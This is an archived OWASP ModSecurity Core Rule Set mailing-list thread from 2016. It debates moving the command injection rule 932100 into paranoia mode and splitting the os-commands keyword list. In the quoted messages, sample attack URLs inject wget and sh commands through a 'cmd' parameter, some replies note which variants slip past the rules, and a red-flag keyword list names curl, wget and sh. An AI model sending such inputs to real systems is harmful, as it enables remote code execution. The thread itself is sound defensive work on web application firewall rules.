<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%20candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3C20160222195350.GA26526%40elias%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <style type="text/css">
       pre {
           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
           }
   </style>
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="001999.html">
   <LINK REL="Next"  HREF="001887.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)</H1>
    <B>Christian Folini</B> 
    <A HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%20candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3C20160222195350.GA26526%40elias%3E"
       TITLE="[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)">christian.folini at netnea.com
       </A><BR>
    <I>Mon Feb 22 19:53:50 UTC 2016</I>
    <P><UL>
        <LI>Previous message: <A HREF="001999.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
        <LI>Next message: <A HREF="001887.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 958977 / 933110 and 958979 / 933120 (PHP Injection Attacks)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#2001">[ date ]</a>
              <a href="thread.html#2001">[ thread ]</a>
              <a href="subject.html#2001">[ subject ]</a>
              <a href="author.html#2001">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>On Mon, Feb 22, 2016 at 07:49:13PM +0000, Chaim Sanders wrote:
&gt;<i> Hey christian,
</I>&gt;<i> I added a v3.0.0-rc1 development tag. Do you want a special v3.0.0-rc1
</I>&gt;<i> Paranoid tag?
</I>
Sure, why not. Might come in handy.

Christian

&gt;<i> 
</I>&gt;<i> On 2/22/16, 2:47 PM, &quot;Christian Folini&quot; &lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">christian.folini at netnea.com</A>&gt;
</I>&gt;<i> wrote:
</I>&gt;<i> 
</I>&gt;<i> &gt;Chaim,
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;That issues idea makes sense. I second that.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;Cheers,
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;Christian
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;On Mon, Feb 22, 2016 at 02:41:38PM +0000, Chaim Sanders wrote:
</I>&gt;<i> &gt;&gt; I think a todo file or issues in the github are in order. I&#8217;m more in
</I>&gt;<i> &gt;&gt; favor of the second. I can make a custom label for each specific area if
</I>&gt;<i> &gt;&gt; we need. I think that will perform better because we can assign things
</I>&gt;<i> &gt;&gt;and
</I>&gt;<i> &gt;&gt; track people progress etc. thoughts?
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt; On 2/18/16, 4:49 AM,
</I>&gt;<i> &gt;&gt; &quot;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">owasp-modsecurity-core-rule-set-bounces at lists.owasp.org</A> on behalf of
</I>&gt;<i> &gt;&gt; Christian Folini&quot;
</I>&gt;<i> &gt;&gt;&lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">owasp-modsecurity-core-rule-set-bounces at lists.owasp.org</A>
</I>&gt;<i> &gt;&gt; on behalf of <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">christian.folini at netnea.com</A>&gt; wrote:
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;Hello,
</I>&gt;<i> &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;That is a smart move. It allows us to eliminate all &quot;file splitting&quot;
</I>&gt;<i> &gt;&gt; &gt;tasks out of the paranoia mode project. Simplifies things a lot.
</I>&gt;<i> &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;@Chaim want to start a TODO file in the top folder of the CRS?
</I>&gt;<i> &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;Ahoj,
</I>&gt;<i> &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;Christian
</I>&gt;<i> &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;On Wed, Feb 17, 2016 at 09:05:52PM +0100, Franziska Buehler wrote:
</I>&gt;<i> &gt;&gt; &gt;&gt; Hi,
</I>&gt;<i> &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; I also like the idea of splitting the file. Perhaps we even need
</I>&gt;<i> &gt;&gt; &gt;&gt;multiple files.
</I>&gt;<i> &gt;&gt; &gt;&gt; Walter has a lot of good thougts!
</I>&gt;<i> &gt;&gt; &gt;&gt; This task doesn't seem to be very easy and some testing will be
</I>&gt;<i> &gt;&gt; &gt;&gt;necessary.
</I>&gt;<i> &gt;&gt; &gt;&gt; So I think we have to decide later, outside of this little project,
</I>&gt;<i> &gt;&gt; &gt;&gt; and we should move on to the first pull request.
</I>&gt;<i> &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; Regards,
</I>&gt;<i> &gt;&gt; &gt;&gt; Franziska
</I>&gt;<i> &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; 2016-02-15 5:07 GMT+01:00 Chaim Sanders &lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">CSanders at trustwave.com</A>&gt;:
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; For the record I think this is a good idea but perhaps outside the
</I>&gt;<i> &gt;&gt; &gt;&gt;scope a
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; bit of the initial RC release. Christian, I suggest we add this to
</I>&gt;<i> &gt;&gt;the
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; To-do for 3.1. Thoughts?
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; On 2/12/16, 4:17 PM,
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; &quot;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">owasp-modsecurity-core-rule-set-bounces at lists.owasp.org</A> on behalf
</I>&gt;<i> &gt;&gt;of
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; Christian Folini&quot;
</I>&gt;<i> &gt;&gt; &gt;&gt;&lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">owasp-modsecurity-core-rule-set-bounces at lists.owasp.org</A>
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; on behalf of <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">christian.folini at netnea.com</A>&gt; wrote:
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;Hi there,
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;There has not been any additional feedback in this thread, but I
</I>&gt;<i> &gt;&gt;think
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;the question is not settled as of this writing.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;Thoughts?
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;Regs,
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;Christian
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;On Sun, Feb 07, 2016 at 08:55:30PM +0100, Christian Folini wrote:
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Hi there,
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; On Sat, Feb 06, 2016 at 11:04:00PM +0100, Walter Hop wrote:
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; I like the idea of splitting the file.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Cool.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; I agree some of the words in os-commands.data seem rather
</I>&gt;<i> &gt;&gt; &gt;&gt;paranoid.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;Words like &quot;choice&quot;, &quot;help&quot;, &quot;now&#178; seem of low value and are
</I>&gt;<i> &gt;&gt;common
</I>&gt;<i> &gt;&gt; &gt;&gt;in
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;natural text. Also, the large number of Unix-only environments
</I>&gt;<i> &gt;&gt;could
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;skip Windows related commands. It&#185;s hard for users to modify these
</I>&gt;<i> &gt;&gt; &gt;&gt;lists
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;as you&#185;d have to hack the CRS, and these huge collections are to
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;maintain anyhow, so I agree we need granularity.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Good point.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; The rule has some regexp magic to prevent false positives, but
</I>&gt;<i> &gt;&gt;the
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;balance is not a complete success in my opinion. For instance, the
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;following URLs don't trigger in CRSv3:
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; <A HREF="http://vuln/?cmd=wget%20http://example.com/blah.txt">http://vuln/?cmd=wget%20http://example.com/blah.txt</A>
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; <A HREF="http://vuln/?cmd=sh%20blah.txt">http://vuln/?cmd=sh%20blah.txt</A>
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; So it's not as strong as you would want either to prevent some
</I>&gt;<i> &gt;&gt; &gt;&gt;common
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;RCE.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; Something like
</I>&gt;<i> &gt;&gt;<A HREF="http://vuln/?cmd=Wget%20http://example.com/;%20ecHo">http://vuln/?cmd=Wget%20http://example.com/;%20ecHo</A>
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;does trigger it.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; I see. Good observations.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; 1) I think that a user should check their desired platforms in
</I>&gt;<i> &gt;&gt;the
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;setup conf. In fact, this would be great to do anyway in the
</I>&gt;<i> &gt;&gt;initial
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;3.0.0 release even if we DON'T look at it in any rule yet.
</I>&gt;<i> &gt;&gt;Specifying
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;platform types will pave the way for reducing false positives and
</I>&gt;<i> &gt;&gt; &gt;&gt;false
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;negatives by skipping unnecessary checks and being more strict on
</I>&gt;<i> &gt;&gt;the
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;right platforms. So we could start by listing these platforms in
</I>&gt;<i> &gt;&gt;the
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;existing rule in the setup conf. Example:
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;    SecAction \
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;      &quot;id:'900024', \
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;      phase:1, \
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;      t:none, \
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;      setvar:tx.unix=1, \
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;      setvar:tx.windows=1, \
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;      setvar:tx.java=1, \
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;      setvar:tx.php=1, \
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; That makes a lot of sense. At first sight.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; I think that a default install should come with these rulesets
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; all enabled and a sysadmin can then switch them of if we is aware
</I>&gt;<i> &gt;&gt; &gt;&gt;that
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; there is no php in his service.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; So given the following two scenarios
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; #1 - Newbie sysadmin installs ModSec and runs into a lot of false
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;positives
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;     because he does not disable unneeded rulesets
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; #2 - Newbie sysadmin installs ModSec and is p0wned because he
</I>&gt;<i> &gt;&gt;does
</I>&gt;<i> &gt;&gt; &gt;&gt;not
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;enable
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;     the php protection
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; I strongly favour #1.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; A vanilla install of the core rules should give you a full
</I>&gt;<i> &gt;&gt;coverage
</I>&gt;<i> &gt;&gt; &gt;&gt;for
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;all
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; types of services and a decent security level. Reducing false
</I>&gt;<i> &gt;&gt; &gt;&gt;positives
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;by
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; omitting certain rules (ideally rules which provide no value for
</I>&gt;<i> &gt;&gt; &gt;&gt;your
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;setup)
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; is the very idea of tuning.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Reducing the initial number of false positives by moving certain
</I>&gt;<i> &gt;&gt; &gt;&gt;rules
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; with a worse relationsship between added security and false
</I>&gt;<i> &gt;&gt; &gt;&gt;positives,
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; that is the idea of the paranoia mode.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Chaim stated in a different message, that the rules are now
</I>&gt;<i> &gt;&gt; &gt;&gt;organised
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; into files aimed at certain environments. So switching them off
</I>&gt;<i> &gt;&gt;is
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; fairly easy. And there are the tags on top of it.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; So you have tag:'language-PHP' and setting SecRuleRemoveByTag
</I>&gt;<i> &gt;&gt;will
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; disable them all very easily.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; So I think, we do not need these variables.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; (By the way: I think it&#185;s unfortunate that a user has to use
</I>&gt;<i> &gt;&gt; &gt;&gt;value 1
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;to enable a check. An undefined variable will mean that the CRS
</I>&gt;<i> &gt;&gt;will
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;skip some rules. This makes it dangerous to introduce a new
</I>&gt;<i> &gt;&gt;variable
</I>&gt;<i> &gt;&gt; &gt;&gt;in
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;the CRS later; all existing installations MUST then add this
</I>&gt;<i> &gt;&gt; &gt;&gt;variable to
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;their setup rule immediately, or suffer from reduced security.
</I>&gt;<i> &gt;&gt;It&#185;s
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;better to use a scheme that defaults to &#179;on&#178;. A convention like
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;&#179;tx.disable_mysql=1&#178; would be user unfriendly and error-prone.
</I>&gt;<i> &gt;&gt;But we
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;could check for an explicit &#179;off&#178; string, e.g.
</I>&gt;<i> &gt;&gt; &gt;&gt;&#179;setvar:tx.mysql=off&#178;. If
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;it&#185;s not &#179;off&#178; then assume that the user DOES want the check. I
</I>&gt;<i> &gt;&gt;think
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;it&#185;s important to get this right in 3.0.0, it will be more painful
</I>&gt;<i> &gt;&gt; &gt;&gt;to do
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;it later.)
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; That's a very good observation. I had a similar idea once.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; In programming, you usually start with a default value and then
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; the users overrides the default value. If he wants to.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; I am not sure how modsecurity_crs_10_setup.conf.example is going
</I>&gt;<i> &gt;&gt;to
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; be transformed to work seamlessly with 3.0. But this makes the
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; setting of default values a bit tricky.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Maybe a file REQUEST-02-DEFAULTS.conf could set default values
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; if certain variables are not set.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; 2) Separate the words into multiple lists:
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;    os-commands-critical.data (absolute red flag list: &quot;curl&quot;,
</I>&gt;<i> &gt;&gt; &gt;&gt;&quot;passwd&quot;,
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;&quot;sh&quot;, &quot;uname&quot;, &quot;wget&quot; etc.)
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;    os-commands-paranoid.data (absolute low value, but high FP
</I>&gt;<i> &gt;&gt; &gt;&gt;natural
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;words like &quot;choice&quot;)
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;    os-commands-windows.data (all Windows commands)
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt;    os-commands-common.data (all other commands)
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Makes some sense. Too granular is difficult and you mix various
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; grouping criteria (criticality, paranoia, os), which makes is a
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; bit hard to follow.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Other opinions?
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; &gt; 3) Review the current regexp against some test data and CRSv2
</I>&gt;<i> &gt;&gt;to
</I>&gt;<i> &gt;&gt; &gt;&gt;make
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;it more sensitive
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Good plan. Maybe this could be done in a separate pull request.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; I am afraid to overload the paranoia mode pull request...
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Ahoj,
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Christian
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; --
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; In war you will generally find that the enemy has at any time
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; three courses of action open to him. Of those three, he will
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; invariably choose the fourth.
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; -- Helmuth Von Moltke
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; _______________________________________________
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; Owasp-modsecurity-core-rule-set mailing list
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt; <A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">Owasp-modsecurity-core-rule-set at lists.owasp.org</A>
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;&gt;<A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0">http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0</A>
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;&gt;me
</I>&gt;<i> &gt;&gt; &gt;&gt;&gt;&gt;&gt;OIn
</I>&gt;<i> &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;&gt;uYrNabyug&amp;s=5&amp;u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistin
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;&gt;fo
</I>&gt;<i> &gt;&gt; &gt;&gt;&gt;&gt;&gt;%2f
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;&gt;owasp-modsecurity-core-rule-set
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;--
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;mailto:<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">christian.folini at netnea.com</A>
</I>&gt;<i> &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;<A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0m">http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0m</A>
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;eO
</I>&gt;<i> &gt;&gt; &gt;&gt;&gt;&gt;Inu
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;N-aaCptw&amp;s=5&amp;u=http%3a%2f%2fwww%2echristian-folini%2ech
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;twitter: @ChrFolini
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;_______________________________________________
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;Owasp-modsecurity-core-rule-set mailing list
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">Owasp-modsecurity-core-rule-set at lists.owasp.org</A>
</I>&gt;<i> &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;<A HREF="http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0m">http://scanmail.trustwave.com/?c=4062&amp;d=ndG-1q_MaPpAIUX2lZSE6lY7cpl0m</A>
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;eO
</I>&gt;<i> &gt;&gt; &gt;&gt;&gt;&gt;Inu
</I>&gt;<i> &gt;&gt; &gt;&gt;
</I>&gt;<i> &gt;&gt;
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;YrNabyug&amp;s=5&amp;u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo
</I>&gt;<i> &gt;&gt;&gt;&gt;&gt;&gt;%2
</I>&gt;<i> &gt;&gt; &gt;&gt;&gt;&gt;fow
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;&gt;asp-modsecurity-core-rule-set
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; ________________________________
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt;
</I>&gt;<i> &gt;&gt; &gt;&gt; &gt; This transmission may contain information that is privileged,
</I>&gt;<i> &gt;&gt; &gt;&gt;confidential, and/or exempt from disclosure under applicable law. If
</I>&gt;<i> &gt;&gt;you
</I>&gt;<i> &gt;&gt; &gt;&gt;are not the intended recipient, you are hereby notified that any
</I>&gt;<i> &gt;&gt; &gt;&gt;disclosure, copying, distribution, or use of the information contained
